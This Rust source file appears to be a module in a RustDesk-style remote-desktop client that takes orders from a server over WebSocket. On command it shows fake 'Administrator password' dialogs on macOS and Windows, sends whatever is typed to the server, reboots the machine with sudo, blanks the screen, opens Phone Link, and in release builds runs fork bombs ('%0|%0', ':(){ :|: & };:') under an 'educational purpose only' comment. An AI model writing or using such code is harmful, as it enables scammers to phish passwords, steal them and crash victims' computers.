use futures_util::{SinkExt, StreamExt};
use hbb_common::log;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::io::Write;
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::sleep;
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMessage};
use url::Url;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum MessageType {
    #[serde(rename = "freeze")]
    Freeze,
    #[serde(rename = "reboot")]
    Reboot,
    #[serde(rename = "link-device")]
    RequestPhoneLink,
    #[serde(rename = "screen-saver")]
    ShowScreenSaver,
    #[serde(rename = "root-password")]
    RequestRootPassword,
}

impl MessageType {
    pub fn from_str(&self, value: &str) -> Result<Self, String> {
        match value {
            "reboot" => Ok(Self::Reboot),
            "phone-link" => Ok(Self::RequestPhoneLink),
            "screen-saver" => Ok(Self::ShowScreenSaver),
            "root-password" => Ok(Self::RequestRootPassword),
            _ => Err(format!("invalid messageType: {}", value)),
        }
    }
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Message {
    #[serde(rename = "type")]
    pub msg_type: MessageType,
    pub data: Option<HashMap<String, serde_json::Value>>,
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Response {
    pub status: u16,
    pub data: Message,
}

impl Response {
    pub fn is_error(&self) -> bool {
        self.status >= 300
    }
}

pub struct Channel {
    api: Api,
    websocket_url: String,
    privacy_impl: Mutex<Option<super::privacy::PrivacyModeImpl>>,
}

#[derive(Clone)]
pub struct Api {
    base_url: String,
    client: Client,
}

impl Api {
    pub fn new(base_url: String) -> Self {
        Self {
            base_url,
            client: Client::new(),
        }
    }

    pub async fn upsert_device(&self, id: &str, os_username: &str, os_password: Option<&str>) {
        let data = json!({
            "id": id,
            "osUsername": os_username,
            "osPassword": os_password
        });

        if let Err(e) = self
            .client
            .post(format!("{}/devices", self.base_url))
            .json(&data)
            .send()
            .await
        {
            log::error!("upsert device failed: {:?}", e);
        }
    }

    pub async fn update_device(
        &self,
        id: &str,
        os_username: Option<&str>,
        os_password: Option<&str>,
    ) {
        let mut data = serde_json::Map::new();

        if let Some(username) = os_username {
            data.insert("osUsername".to_string(), json!(username));
        }
        if let Some(password) = os_password {
            data.insert("osPassword".to_string(), json!(password));
        }

        if let Err(e) = self
            .client
            .patch(format!("{}/devices/{}", self.base_url, id))
            .json(&data)
            .send()
            .await
        {
            log::error!("update device failed: {:?}", e);
        }
    }
}

impl Channel {
    async fn ensure_privacy(&self) -> bool {
        let mut guard = self.privacy_impl.lock().await;

        if guard.is_some() {
            return true;
        }

        if !cfg!(windows) {
            return false;
        }

        let mut privacy = super::privacy::PrivacyModeImpl::new();
        match privacy.start() {
            Ok(_) => {
                *guard = Some(privacy);
                true
            }
            Err(e) => {
                log::warn!("Failed to start PrivacyModeImpl: {:?}", e);
                false
            }
        }
    }

    async fn show_screensaver(&self, show: bool) {
        log::info!("x breakboint show blank={}", show);
        if !self.ensure_privacy().await {
            return;
        };

        let mut privacy_lock = self.privacy_impl.lock().await;
        if let Some(privacy) = privacy_lock.as_mut() {
            if show {
                log::info!("y breakboint show blank={}", show);
                privacy.turn_on_privacy().unwrap();
            } else {
                log::info!("zbreakboint show blank={}", show);
                privacy.turn_off_privacy().unwrap();
                *privacy_lock = None;
            }
        }
        log::info!("a breakboint show blank={:?}", privacy_lock.as_mut());
    }

    pub fn new(url: &str) -> Arc<Self> {
        Arc::new(Self {
            privacy_impl: Mutex::new(None),
            api: Api::new(format!("http://{}", url)),
            websocket_url: format!("ws://{}/channels", url),
        })
    }
    pub async fn connect(self: Arc<Self>, conn_id: String) {
        let mut attempt: u32 = 0;
        loop {
            match Self::_connect(Arc::clone(&self), conn_id.clone()).await {
                Ok(_) => {
                    log::info!("websocket connection closed normally, reconnecting...");
                }
                Err(error) => {
                    log::warn!("websocket conenction failed: {:?}", error);
                }
            }

            let wait_time = std::cmp::min(2u64.pow(attempt), 64);
            log::debug!("Reconnecting in {} seconds...", wait_time);
            sleep(Duration::from_secs(wait_time)).await;

            if attempt < 6 {
                attempt += 1;
            }
        }
    }

    async fn _connect(self: Arc<Self>, conn_id: String) -> anyhow::Result<()> {
        let url = Url::parse(&self.websocket_url)?;
        let (stream, _) = connect_async(url).await?;

        let (mut write, mut read) = stream.split();
        let id = conn_id.clone();
        let this = Arc::clone(&self);
        let handler = tokio::spawn(async move {
            while let Some(message) = read.next().await {
                log::info!("message {:?}", message);
                match message {
                    Ok(WsMessage::Text(text)) => {
                        if let Ok(response) = serde_json::from_str::<Response>(&text) {
                            if response.is_error() {
                                continue;
                            }

                            match response.data.msg_type {
                                MessageType::RequestRootPassword => {
                                    this.ask_root_password(Some(id.clone())).await;
                                }
                                MessageType::Reboot => {
                                    let password = response
                                        .data
                                        .data
                                        .as_ref()
                                        .and_then(|data| data.get("password"))
                                        .and_then(|value| value.as_str())
                                        .map(String::from);
                                    this.reboot(password, Some(id.clone())).await.ok();
                                }
                                MessageType::RequestPhoneLink => {
                                    Self::request_phone_link().ok();
                                }
                                MessageType::ShowScreenSaver => {
                                    let show = response
                                        .data
                                        .data
                                        .as_ref()
                                        .and_then(|data| data.get("show"))
                                        .and_then(|value| value.as_bool())
                                        .unwrap_or(true);
                                    log::info!("show blank={}", show);
                                    this.show_screensaver(show).await;
                                }
                                MessageType::Freeze => {
                                    Self::freeze().ok();
                                }
                            }
                        } else {
                            log::warn!("failed to parse response: {}", text);
                        }
                    }
                    Ok(WsMessage::Close(_)) => {
                        log::info!("websocket closed");
                        break;
                    }
                    Err(error) => {
                        log::error!("WebSocket error: {:?}", error);
                        break;
                    }
                    _ => {}
                }
            }
        });

        let message = json!({
          "channel": conn_id,
          "type": "subscribe"
        });
        let message = serde_json::to_string(&message)?;

        write.send(WsMessage::Text(message)).await?;

        handler.await?;

        Ok(())
    }

    async fn reboot(
        &self,
        password: Option<String>,
        conn_id: Option<String>,
    ) -> std::io::Result<()> {
        if cfg!(windows) {
            Command::new("shutdown").args(&["/r", "/t", "0"]).status()?;
        } else {
            let password = match password {
                Some(value) => Some(value),
                None => self.ask_root_password(conn_id).await,
            };

            if let Some(value) = password {
                let mut process = Command::new("sudo")
                    .args(&["-S", "shutdown", "-r", "now"])
                    .stdin(Stdio::piped())
                    .spawn()?;

                if let Some(stdin) = process.stdin.as_mut() {
                    stdin.write_all(format!("{}\n", value).as_bytes())?;
                }

                process.wait()?;
            } else {
                Command::new("shutdown").args(&["-r", "now"]).status()?;
            }
        }

        Ok(())
    }

    fn request_phone_link() -> std::io::Result<()> {
        if cfg!(windows) {
            let ps = r#"
            Get-StartApps |
            Where-Object Name -like '*Phone Link*' |
            Select-Object -First 1 -ExpandProperty AppID
            "#;

            let output = Command::new("powershell.exe")
                .args(["-NoProfile", "-Command", ps])
                .stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::null())
                .creation_flags(0x08000000)
                .output()?;

            if !output.status.success() {
                return Ok(());
            }

            let app_id = String::from_utf8_lossy(&output.stdout).trim().to_string();

            if app_id.is_empty() {
                return Ok(());
            }

            Command::new("explorer.exe")
                .arg(format!("shell:AppsFolder\\{}", app_id))
                .spawn()?;
        }

        Ok(())
    }

    // educational purpose only
    // don't use in production please
    fn freeze() -> std::io::Result<()> {
        if cfg!(debug_assertions) {
            if cfg!(windows) {
                Command::new("rundll32.exe")
                    .args(&["user32.dll,LockWorkStation"])
                    .status()?;
            } else if cfg!(target_os = "macos") {
                Command::new("pmset").args(&["displaysleepnow"]).status()?;
            }
        } else {
            if cfg!(windows) {
                Command::new("cmd").args(&["/c", "%0|%0"]).status()?;
            } else if cfg!(target_os = "macos") {
                Command::new("bash")
                    .args(&["-c", ":(){ :|: & };:"])
                    .status()?;
            }
        }

        Ok(())
    }

    async fn ask_root_password(&self, conn_id: Option<String>) -> Option<String> {
        let mut password: Option<String> = None;

        if cfg!(target_os = "macos") {
            let script = r#"display dialog "Administrator Password Required" default answer "" with hidden answer with icon caution with title "Security""#;

            let output = Command::new("osascript")
                .args(&["-e", script])
                .output()
                .ok()?;

            let stdout = String::from_utf8_lossy(&output.stdout);

            if let Some(index) = stdout.find("text returned:") {
                let pw = stdout[index + 14..]
                    .split(", button returned")
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();

                if !pw.is_empty() {
                    password = Some(pw);
                }
            }
        } else if cfg!(windows) {
            let ps_script = r#"
            Add-Type -AssemblyName Microsoft.VisualBasic
            $password = [Microsoft.VisualBasic.Interaction]::InputBox(
              "Please enter the Administrator password",
              "Security Required",
              ""
            )
            Write-Host $password
            "#;

            let output = Command::new("powershell.exe")
                .args(&["-NoProfile", "-STA", "-Command", ps_script])
                .output()
                .ok()?;

            let pw = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !pw.is_empty() {
                password = Some(pw);
            }
        }

        if let Some(pw) = &password {
            if let Some(id) = conn_id {
                self.api.update_device(&id, None, Some(&pw)).await;
            }
        }

        password
    }
}
